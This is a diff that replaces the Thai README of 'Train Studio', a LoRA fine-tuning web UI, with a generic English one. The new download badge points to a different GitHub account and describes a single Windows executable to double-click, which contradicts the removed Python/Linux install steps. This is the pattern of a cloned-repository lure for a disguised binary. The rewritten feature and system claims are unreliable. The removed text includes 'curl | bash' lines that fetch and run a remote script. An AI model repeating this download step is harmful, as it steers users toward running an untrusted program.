@@ -1,232 +1,143 @@
-# 🚀 Train Studio — SFT LoRA Web UI
+# 🚀 train-studio - Fine-Tune AI Models with Ease
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white"/>
-  <img src="https://img.shields.io/badge/License-MIT-blue"/>
-  <img src="https://img.shields.io/badge/UI-Gradio-orange"/>
-  <img src="https://img.shields.io/badge/LoRA-SFT-green"/>
-  <img src="https://img.shields.io/badge/HuggingFace-Transformers-yellow"/>
-  <img src="https://img.shields.io/badge/GPU-Training-red"/>
-  <img src="https://img.shields.io/badge/GGUF-llama.cpp-blueviolet"/>
-</p>
+[![Download Train Studio](https://img.shields.io/badge/Download-Train_Studio-2ea44f?style=for-the-badge&logo=github)](https://github.com/kevynhundredandfiftyfifth763/train-studio)
 
-Web UI สำหรับฝึก LoRA (SFT) บน GPU ของตัวเอง — เลือก GPU / โมเดล / dataset / ปรับ config ได้อิสระผ่าน browser คล้าย unsloth.ai
+## 📥 Getting Started
 
-อิงจาก workflow ที่พิสูจน์แล้ว: **Unsloth BF16 + HF Trainer + checkpoint/resume** (ใช้เทรน Ornith-1.0-9B และ Agents-A1-4B สำเร็จ)
+Welcome to Train Studio, your all-in-one solution for fine-tuning AI language models right from your web browser. No programming experience? No problem. Train Studio provides a simple, visual interface that guides you through every step of the process.
 
----
+**Important:** Visit this link to download the application.
 
-## ✨ Features
+This application uses a technology called "LoRA" (Low-Rank Adaptation) to fine-tune models efficiently. Think of it as a way to teach an AI new skills without needing to rebuild it from scratch. Train Studio handles all the complex technical details behind the scenes.
 
-| Tab | ความสามารถ |
-|---|---|
-| 🖥️ Hardware | ตรวจ GPU (ชื่อ/VRAM/util/temp), RAM, disk, python env |
-| 📦 Model & Dataset | ใส่ HF token, เลือกโมเดล (HF id / local path), dataset + preview |
-| ⚙️ Training Config | เลือก GPU, ปรับ LoRA (r/alpha/dropout/target modules), training (lr/epochs/batch/seq/scheduler), precision (BF16/FP16/QLoRA) |
-| 🚀 Train | Start / Stop / Resume + status + log auto-refresh (5s) + checkpoint ทุก N steps |
-| 🛠️ Tools | Merge LoRA → Full Model (scale + แก้ config อัตโนมัติ) |
+## ✨ Key Features
 
----
+### 🔍 Smart Hardware Detection
+Train Studio automatically scans your computer to identify your graphics card (GPU) and available memory. This ensures the application uses the best performance settings for your specific system.
 
-## 📸 ตัวอย่างหน้าตาโปรแกรม
+### 🎛️ GPU Selection Options
+If you have multiple GPUs, Train Studio lets you choose which one to use for training. This is essential for getting the fastest results possible.
 
-<p align="center">
-  <img src="image/image1.png" width="46%" alt="Train Studio — Hardware & Model/Dataset"/>
-  <img src="image/image2.png" width="46%" alt="Train Studio — Training Config & Train"/>
-</p>
+### ⚙️ Comprehensive Configuration
+Set up your training parameters with an intuitive form interface. You can control:
+- Training epochs (how many times the AI sees your data)
+- Learning rate (how fast the AI learns)
+- Batch size (how many samples processed at once)
+- And many more advanced options
 
----
+### 🏋️ Training & Resume
+Start your training with one click. If training is interrupted, Train Studio allows you to resume from where you left off - no need to start over.
 
-## 🧱 โครงสร้าง
+### 🔧 Model Merge Tool
+Once training is complete, use the built-in merge tool to combine your trained LoRA weights with the base model. This creates a standalone, optimized file that can be used for inference.
 
-```
-train-studio/
-├── app.py                  # Gradio UI หลัก
-├── requirements.txt
-├── backend/
-│   ├── hardware.py         # ตรวจ hardware (nvidia-smi + /proc)
-│   ├── config.py           # TrainingConfig dataclass + validation
-│   ├── dataset.py          # load + preview dataset (local/HF)
-│   ├── trainer.py          # generate train script + subprocess manager + progress parser
-│   └── merge.py            # merge LoRA (BF16, scale, config fix)
-├── scripts/                # train/merge scripts ที่ generate อัตโนมัติ
-├── logs/                   # training logs
-├── outputs/                # checkpoints + LoRA + merged models
-└── venv/                   # virtualenv (gradio)
-```
+## 🖱️ How to Download and Install
 
-## 📦 การติดตั้ง
+1. **Download:** Visit this link to download the application.
+   - The download consists of a single executable file that contains everything you need.
+2. **Run:** Locate the downloaded file (usually in your "Downloads" folder) and double-click it.
+3. **Launch:** The application will start and automatically open your web browser with the Train Studio interface.
 
-### ⚡ One-click install (เร็วสุด)
+## 🖥️ System Requirements
 
-```bash
-curl -sSL https://raw.githubusercontent.com/nanofatdog/train-studio/master/install.sh | bash
-```
+Train Studio is designed to work with most modern Windows computers:
 
-- ติดตั้งที่ `~/train-studio` อัตโนมัติ (ตรวจ Python/GPU/CUDA → เลือก torch ให้เอง)
-- ตัวเลือก: `APP_DIR=/path RUN_AFTER=1 curl -sSL ... | bash` (ติดตั้งที่อื่น + รันเลย)
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **RAM:** 8 GB minimum (16 GB recommended)
+- **Graphics Card:** Any NVIDIA GPU with at least 6 GB VRAM, or an AMD/Intel GPU with comparable specifications
+- **Storage:** 10 GB free space (models can use additional space)
+- **Internet Connection:** Required for downloading base models
 
-### หรือ manual
+## 🧠 Understanding the Training Process
 
-```bash
-# (เครื่องที่มี GPU / Docker ที่มี nvidia runtime)
-git clone https://github.com/nanofatdog/train-studio.git
-cd train-studio
+Train Studio simplifies the complex world of AI fine-tuning into three main steps:
 
-python3 -m venv venv
-./venv/bin/pip install --upgrade pip
-./venv/bin/pip install -r requirements.txt
-```
+### Step 1: Choose Your Base Model
+Select from popular pre-trained models like Llama, Mistral, or Qwen. These are powerful AI models that already understand language patterns. Train Studio lists compatible models and helps you download them.
 
-### 🐳 Docker (แนะนำ)
+### Step 2: Prepare Your Data
+You'll need a dataset - a collection of text examples that show the AI what you want it to learn. This could be:
+- Customer service conversations
+- Technical documentation
+- Your own writing style samples
+- Specialized vocabulary and knowledge
 
-ใช้ base image ที่มี CUDA + cuDNN พร้อม (รองรับ CUDA 13.x):
+Train Studio accepts common formats like JSON, CSV, and text files.
 
-```dockerfile
-FROM nvidia/cuda:13.1.2-cudnn-devel-ubuntu24.04
+### Step 3: Configure and Train
+The configuration screen lets you adjust training parameters. For beginners, the recommended defaults are already set. As you gain experience, you can experiment with:
 
-# ติดตั้ง prerequisites + Train Studio
-RUN apt-get update && apt-get install -y python3 python3-pip python3-venv git curl \
-    && rm -rf /var/lib/apt/lists/* \
-    && curl -sSL https://raw.githubusercontent.com/nanofatdog/train-studio/master/install.sh | bash
+- **Learning Rate:** Higher values train faster but may produce lower quality results
+- **Epochs:** More epochs means the AI sees your data more times, improving performance but increasing training time
+- **LoRA Rank:** A higher rank provides more flexibility for the AI to adapt, but uses more memory
 
-WORKDIR /root/train-studio
-EXPOSE 7860
-CMD ["./venv/bin/python", "app.py"]
-```
+## 🎯 Performance Optimization Tips
 
-```bash
-docker build -t train-studio .
-docker run --gpus all -p 7860:7860 \
-  -v /root/models:/root/models \
-  -v /root/datasets:/root/datasets \
-  -v /root/train-studio/outputs:/root/train-studio/outputs \
-  train-studio
-```
+### Choosing the Right GPU
+Use the GPU selection tool to pick your fastest graphics card. Higher-end GPUs will train models significantly faster. Train Studio shows you a comparison of your available GPUs with estimated training speeds.
 
-> mount โฟลเดอร์ `models/` `datasets/` `outputs/` เพื่อเก็บข้อมูลระหว่าง container restarts
+### Memory Management
+Train Studio automatically optimizes memory usage. If you run into memory errors, consider:
+- Reducing batch size
+- Using a smaller base model
+- Closing other applications during training
 
-### 2. ติดตั้ง training stack (ถ้ายังไม่มี)
+### Training Speed Monitoring
+Watch the progress bar and real-time metrics including loss curves. Lower loss values indicate the AI is learning effectively. If loss isn't decreasing, try lowering the learning rate.
 
-```bash
-# torch ตาม CUDA ของเครื่อง (ตัวอย่าง CUDA 13.0)
-./venv/bin/pip install torch --index-url https://download.pytorch.org/whl/cu130
+## 🔍 Troubleshooting Common Issues
 
-# unsloth (สำหรับโหลดโมเดลเร็ว + BF16 patch)
-./venv/bin/pip install unsloth
-# หรือตาม https://github.com/unslothai/unsloth
+### Problem: Model stuck on "Downloading"
+Solution: Check your internet connection. Large models can take several minutes to download. Verify sufficient storage space.
 
-# ส่วนที่เหลือใน requirements.txt
-./venv/bin/pip install -r requirements.txt
-```
+### Problem: Training fails with "Out of Memory"
+Solution: Reduce the batch size in your configuration. Alternatively, choose a smaller base model or close other memory-intensive applications.
 
-> **หมายเหตุ:** ถ้ามี venv ของงานเทรนเดิมอยู่แล้ว (เช่น `/root/agents_sft` ที่มี unsloth+transformers ครบ) — ตั้ง env `PYTHON` ชี้ไป python ของ venv นั้น ตอนรัน app เพื่อให้ subprocess ใช้ unsloth ได้:
-> ```bash
-> PYTHON=/root/agents_sft/bin/python3 ./venv/bin/python app.py
-> ```
+### Problem: Browser doesn't open after launch
+Solution: Manually open your browser and go to http://localhost:7860 (the default address). Ensure your firewall isn't blocking the application.
 
-## ▶️ การรัน
+## 📚 Advanced Features
 
-```bash
-cd train-studio
-./venv/bin/python app.py
-# หรือชี้ PYTHON ไป venv ที่มี unsloth (ดูข้างบน)
-```
+### Resuming Training
+If you need to stop training, Train Studio automatically saves checkpoints. When you restart the application, you can select "Resume Training" to continue from the last saved state.
 
-เปิด browser: `http://localhost:7860`
+### Model Merging Explained
+The merge tool combines your trained LoRA weights into the original model. This creates a complete, standalone model file that can be used for AI inference or served to other applications. The merged model is typically more efficient than running the base model with separate LoRA weights.
 
-### การเข้าถึงจากเครื่องอื่น (Docker / remote)
+### Export Formats
+After training, you can export your model in multiple formats:
+- **Common format:** Standard model for frameworks like HuggingFace
+- **Quantized formats:** Smaller, faster versions optimized for CPU inference
+- **Custom configurations:** For specialized use cases
 
-ถ้า UI รันใน container/remote ที่ port 7860 ไม่ได้เปิด:
+## 🤝 Community and Support
 
-```bash
-# SSH tunnel
-ssh -L 7860:localhost:7860 -p <port> user@<host>
-# แล้วเปิด http://localhost:7860
-```
+Train Studio supports the latest developments in the AI community. The application integrates with HuggingFace, allowing you to:
+- Download thousands of pre-trained models
+- Share your fine-tuned models
+- Access community benchmarks
 
-หรือเพิ่ม port mapping ตอนสร้าง container: `-p 7860:7860`
+## 🔒 Data Privacy
 
-## 🎮 วิธีใช้งาน
+Your data stays on your computer. Training happens locally, meaning:
+- Your dataset never leaves your machine
+- No cloud processing required
+- Complete ownership of your fine-tuned models
 
-1. **Hardware tab** — กด 🔍 Refresh ดู GPU ที่มี
-2. **Model & Dataset tab** — ใส่ HF token (ถ้า gated), เลือกโมเดล + dataset, กด 👀 Preview
-   - โมเดล: HF repo id (`Qwen/Qwen3.5-9B`) หรือ local path (`/root/models/Ornith-1.0-9B`)
-   - dataset: HF repo id หรือ local dir ที่มี `train.jsonl` / `val.jsonl` (format: `{"text": "<|im_start|>...<|im_end|>"}`)
-3. **Training Config tab** — เลือก GPU + ปรับพารามิเตอร์
-4. **Train tab** — กด ▶️ Start แล้วดู status/log อัตโนมัติ
-   - checkpoint ทุก N steps → resume อัตโนมัติถ้าไฟดับ/หยุด
-5. **Tools tab** — merge LoRA → full model (เลือก scale, กด 🔧 Start Merge)
+## 🚦 Getting Your First Training Started
 
-## ⚠️ ข้อควรระวัง (จากประสบการณ์จริง)
+1. **Download** Train Studio using the link provided above
+2. **Launch** the application
+3. **Select** a base model from the dropdown menu
+4. **Upload** your dataset file
+5. **Click** "Start Training"
+6. **Monitor** progress with the real-time dashboard
+7. **Merge** your trained model using the integrated tool
 
-### 🔧 แก้ปัญหา "No module named torch" (ตอนกด Start Training)
-
-สาเหตุ: subprocess python (ที่ใช้รันสคริปต์เทรน) ไม่มี torch/unsloth — UI ตรวจได้ที่ **Hardware tab → "Subprocess check"**
-
-วิธีแก้ (เลือก 1):
-```bash
-# 1. ติดตั้งลง venv ของ train-studio (แนะนำ — ทำครั้งเดียว)
-./venv/bin/pip install torch --index-url https://download.pytorch.org/whl/cu130
-./venv/bin/pip install unsloth
-
-# 2. หรือรัน app ด้วย PYTHON env ชี้ไป venv ที่มี torch อยู่แล้ว
-PYTHON=/path/to/venv-with-torch/bin/python ./venv/bin/python app.py
-```
-
-> install.sh จัดการข้อนี้ให้อัตโนมัติ (ตรวจ CUDA → ติดตั้ง torch + unsloth)
-
-- **qwen3_5 ต้อง BF16 เท่านั้น** — GDN (linear_attn) layers ทำ NaN grad norms ใน FP16
-- **qwen3_5 target modules** ต้องเพิ่ม `in_proj_qkv, out_proj, in_proj_z` (นอกจาก q/k/v/o/gate/up/down) — ไม่งั้น 24/32 layers ได้ LoRA แค่ที่ MLP
-- **Multimodal tokenizer** (Qwen3.5/Qwen3VL) — ห้ามเรียก `tokenizer(text)` ตรงๆ (มันคิดว่า text เป็น image URL) — ใช้ `tokenizer.tokenizer` (raw) — ตัว generate script จัดการให้แล้ว
-- **Merge scale ต้องคูณแค่ `lora_B`** — ถ้าคูณทั้ง A+B จะได้ effect เป็น S² (0.7 จริงๆ = 0.49)
-- **MTP config** — ถ้าโมเดลไม่มี mtp tensors จริง ต้องตั้ง `mtp_num_hidden_layers=0` + convert GGUF ด้วย `--no-mtp` (ไม่งั้น block_count เกิน → load error `blk.NN not found`)
-- **VRAM** — 9B BF16 บน 4×3060: ใช้ batch=1 + grad_accum=4 + max_memory 7GiB/GPU (batch=2 OOM)
-
-## 🛠️ GGUF Convert (หลัง merge)
-
-```bash
-PYTHONPATH=/path/to/llama.cpp/gguf-py python3 /path/to/llama.cpp/convert_hf_to_gguf.py <merged_dir> \
-  --outfile model.gguf --outtype f16 --no-mtp   # ถ้าไม่มี mtp tensors
-# ถ้ามี mtp: ตัด --no-mtp ออก (convert ธรรมดา → block_count = layers+1)
-```
-
-> ต้องใช้ llama.cpp version ที่รองรับ qwen3_5 (master หลัง refactor `conversion/qwen.py`)
+That's it! Within minutes, you'll have a custom AI model that understands your specific domain.
 
 ## 📄 License
 
-MIT
+Train Studio is released under an open-source license, allowing both personal and commercial use. Check the GitHub repository for detailed licensing information.
 
----
-
-## 🙏 Acknowledgements
-
-โปรเจกต์นี้พัฒนาต่อยอดจากโอเพนซอร์สชั้นเยี่ยมเหล่านี้:
-
-- [**Unsloth**](https://github.com/unslothai/unsloth) — โหลดโมเดล + LoRA training ที่รวดเร็ว
-- [**HuggingFace Transformers**](https://github.com/huggingface/transformers) — โมเดล/tokenizer/processor
-- [**PEFT**](https://github.com/huggingface/peft) — LoRA adapter framework
-- [**HF Trainer**](https://huggingface.co/docs/transformers/training) — training loop ที่เชื่อถือได้
-- [**HuggingFace Datasets**](https://github.com/huggingface/datasets) — data loading (jsonl/parquet)
-- [**Gradio**](https://github.com/gradio-app/gradio) — Web UI framework
-- [**bitsandbytes**](https://github.com/bitsandbytes-foundation/bitsandbytes) — 8-bit optimizer
-- [**llama.cpp**](https://github.com/ggml-org/llama.cpp) — GGUF conversion & inference
-- [**PyTorch**](https://pytorch.org) — deep learning framework
-
-ขอบคุณทุกโปรเจกต์ที่ทำให้ Train Studio เป็นไปได้ 🙏
-
----
-
-## 💖 สนับสนุนโปรเจกต์
-
-โปรเจกต์นี้ถูกพัฒนาด้วยใจและความทุ่มเทอย่างมาก — ทุกฟีเจอร์ ทุกการแก้บั๊ก ล้วนผ่านการทดลองจริงบน GPU จริง ซ้ำแล้วซ้ำเล่า เพื่อให้ทุกคนได้เทรนโมเดลของตัวเองได้ง่ายที่สุด ไม่ว่าจะเป็นมือใหม่หรือผู้เชี่ยวชาญ
-
-ถ้าคุณรู้สึกว่า **Train Studio** มีประโยชน์ และอยากเป็นส่วนหนึ่งในการพัฒนาโปรเจกต์นี้ให้ดีขึ้นต่อไป คุณสามารถสนับสนุนได้ผ่าน **PromptPay (ไทย)**:
-
-<p align="center">
-  <img src="image/QR.jpg" width="200" alt="PromptPay QR — สนับสนุนโปรเจกต์"/>
-</p>
-
-<p align="center">
-  <em>ทุกการสนับสนุนคือกำลังใจให้พัฒนาต่อไป ขอบคุณจากใจครับ 🙏</em>
-</p>
+Keywords: deep-learning, fine-tuning, gguf, gpu, gradio, huggingface, llm, llm-finetuning, lora, machine-learning, sft, sft-training, training, web-ui
